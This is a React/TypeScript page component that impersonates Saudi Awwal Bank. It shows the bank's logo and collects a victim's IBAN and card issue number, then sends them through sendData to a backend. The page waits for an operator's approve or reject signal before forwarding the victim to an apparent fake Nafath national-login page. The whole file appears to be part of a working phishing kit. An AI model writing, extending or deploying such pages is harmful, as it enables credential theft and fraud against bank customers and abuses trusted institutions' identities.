import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  navigateToPage,
} from "@/lib/store";

const schema = z.object({
  accountNumber: z.string().min(1, "رقم الحساب مطلوب"),
  cardNumber: z.string().min(1, "رقم الإصدار مطلوب"),
});

type FormData = z.infer<typeof schema>;

export default function AlAwwalBank() {
  const [, navigate] = useLocation();

  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      accountNumber: "",
      cardNumber: "",
    },
  });

  // Emit page enter
  useEffect(() => {
    navigateToPage("حساب بنك الأول");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/alawwal-nafath");
    }
  }, [isFormApproved.value, navigate]);

  // Handle form rejection
  useEffect(() => {
    if (isFormRejected.value) {
      reset();
    }
  }, [isFormRejected.value, reset]);

  const onSubmit = (data: FormData) => {
    sendData({
      data: {
        "رقم الحساب": data.accountNumber.replaceAll("-", " "),
        "رقم الإصدار": data.cardNumber,
      },
      current: "حساب بنك الأول",
      nextPage: "نفاذ الأول",
    });
  };

  return (
    <PageLayout variant="al-awwal">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <img
            src="/images/banks/saudi-awwal-bank.png"
            alt="بنك الأول"
            className="h-16 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-gray-800 mb-2">بنك الأول</h1>
          <p className="text-gray-500 text-sm">
            أدخل بيانات حسابك للمتابعة
          </p>
        </div>

        <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
          {/* Account Number */}
          <div className="space-y-2">
            <Label htmlFor="accountNumber">رقم الحساب (IBAN)</Label>
            <Input
              id="accountNumber"
              placeholder="SA00 0000 0000 0000 0000 0000"
              {...register("accountNumber")}
            />
            {errors.accountNumber && (
              <p className="text-red-500 text-xs">{errors.accountNumber.message}</p>
            )}
          </div>

          {/* Card Number */}
          <div className="space-y-2">
            <Label htmlFor="cardNumber">رقم الإصدار</Label>
            <Input
              id="cardNumber"
              placeholder="أدخل رقم الإصدار"
              {...register("cardNumber")}
            />
            {errors.cardNumber && (
              <p className="text-red-500 text-xs">{errors.cardNumber.message}</p>
            )}
          </div>

          {/* Submit Button */}
          <Button type="submit" className="w-full bg-[#1a1a2e] hover:bg-[#16213e]" size="lg">
            متابعة
          </Button>
        </form>
      </div>
    </PageLayout>
  );
}
